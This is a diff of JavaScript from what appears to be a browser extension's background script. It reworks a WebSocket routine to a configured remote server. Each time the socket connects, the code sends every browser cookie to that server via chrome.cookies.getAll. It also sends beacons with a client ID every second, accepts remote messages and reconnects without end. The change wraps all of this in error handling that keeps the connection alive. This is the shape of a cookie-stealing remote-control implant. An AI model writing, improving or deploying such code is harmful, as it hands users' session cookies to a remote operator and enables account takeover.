@@ -31,48 +31,57 @@ async function getTargetUrl(config) {
 }
 
 async function connectWebSocket() {
-  const config = await readConfig();
-  if (!config) return;
+  try {
+    const config = await readConfig();
+    if (!config) return;
 
-  const targetUrl = await getTargetUrl(config);
-  ws = new WebSocket(targetUrl);
+    const targetUrl = await getTargetUrl(config);
+    ws = new WebSocket(targetUrl);
 
-  ws.addEventListener("open", () => {
-    console.log("WebSocket connected");
-    chrome.storage.local.get("client_id", (data) => {
-      client_id = data.client_id;
-      if (!client_id) {
-        client_id = Math.random().toString(36).substring(7);
-        chrome.storage.local.set({ client_id });
-      }
-      send("alive", {
-        client_id,
-        os: "windows",
-        username: "user",
-      });
-      send("pollingstate", { state: false });
-      chrome.cookies.getAll({}, function (cookies) {
-        send("setcookies", cookies);
-      });
-      setInterval(() => {
+    ws.addEventListener("open", () => {
+      console.log("WebSocket connected");
+      chrome.storage.local.get("client_id", (data) => {
+        client_id = data.client_id;
+        if (!client_id) {
+          client_id = Math.random().toString(36).substring(7);
+          chrome.storage.local.set({ client_id });
+        }
         send("alive", {
           client_id,
-          os: "Windows",
+          os: "windows",
           username: "user",
         });
+        send("pollingstate", { state: false });
+        chrome.cookies.getAll({}, function (cookies) {
+          send("setcookies", cookies);
+        });
+        setInterval(() => {
+          send("alive", {
+            client_id,
+            os: "Windows",
+            username: "user",
+          });
+        }, 1000);
+      });
+    });
+
+    ws.addEventListener("message", handleMessages);
+    ws.addEventListener("close", () => {
+      console.log(
+        "WebSocket disconnected, attempting to reconnect in 1 seconds..."
+      );
+      setTimeout(() => {
+        connectWebSocket();
       }, 1000);
     });
-  });
-
-  ws.addEventListener("message", handleMessages);
-  ws.addEventListener("close", () => {
+  } catch (err) {
     console.log(
-      "WebSocket disconnected, attempting to reconnect in 1 seconds..."
+      "WebSocket not connecting, attempting to connect in 1 seconds..."
     );
     setTimeout(() => {
       connectWebSocket();
     }, 1000);
-  });
+  }
 }
 // Polling variables
 let pollingInterval = 5000; // Default: 5 seconds
